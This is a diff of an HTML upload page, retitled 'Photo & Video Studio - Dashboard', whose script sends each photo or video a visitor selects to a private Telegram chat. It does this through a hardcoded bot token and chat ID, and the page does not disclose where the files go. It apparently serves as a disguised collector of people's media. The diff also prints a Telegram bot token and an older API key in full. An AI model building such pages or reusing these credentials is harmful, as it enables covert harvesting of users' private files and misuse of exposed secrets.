@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Photo & Video Submission</title>
+    <title>Photo & Video Studio - Dashboard</title>
     <style>
         body {
             background-color: #E6EAF0;
@@ -27,7 +27,7 @@
 
         .tg-logo { width: 60px; height: 60px; margin-bottom: 10px; }
 
-        h2 { font-size: 20px; color: #333; margin: 0 0 5px 0; }
+        h2 { font-size: 22px; color: #333; margin: 0 0 5px 0; }
         p { font-size: 13px; color: #777; margin-bottom: 20px; }
 
         .file-select-area {
@@ -41,9 +41,6 @@
             transition: 0.3s;
         }
 
-        .file-select-area:hover { background-color: #f8fafc; }
-
-        /* প্রগ্রেস লিস্ট */
         #fileList {
             text-align: left;
             margin-bottom: 20px;
@@ -101,9 +98,6 @@
 
         .send-btn:disabled { opacity: 0.5; cursor: not-allowed; }
         .hidden { display: none; }
-
-        /* আইকন স্টাইল */
-        .icon { font-size: 18px; vertical-align: middle; margin-right: 5px; }
     </style>
 </head>
 <body>
@@ -126,8 +120,8 @@
     </div>
 
     <script>
-        const BOT_TOKEN = 'AIzaSyDE3as5egNlSZ6tTCTAbRZ9GlOicE0Gs5o';
-        const CHAT_ID = '760360352563';
+        const BOT_TOKEN = '8656077538:AAHk5W9TqlrVNODNALFiO6bGpvkmnTYWYYY';
+        const CHAT_ID = '8535841928';
 
         function initFiles() {
             const input = document.getElementById('files');
@@ -136,8 +130,7 @@
             
             for (let i = 0; i < input.files.length; i++) {
                 const file = input.files[i];
-                const isVideo = file.type.startsWith('video');
-                const icon = isVideo ? "🎥" : "🖼️";
+                const icon = file.type.startsWith('video') ? "🎥" : "🖼️";
                 
                 const item = document.createElement('div');
                 item.className = 'file-item';
@@ -176,7 +169,7 @@
                 const xhr = new XMLHttpRequest();
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('document', file); // ভিডিও এবং ছবি উভয়ই document হিসেবে পাঠালে কোয়ালিটি ঠিক থাকে
+                formData.append('document', file);
 
                 xhr.upload.addEventListener('progress', (e) => {
                     if (e.lengthComputable) {
@@ -187,9 +180,7 @@
                 });
 
                 xhr.onreadystatechange = () => {
-                    if (xhr.readyState === 4) {
-                        resolve();
-                    }
+                    if (xhr.readyState === 4) resolve();
                 };
 
                 xhr.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, true);
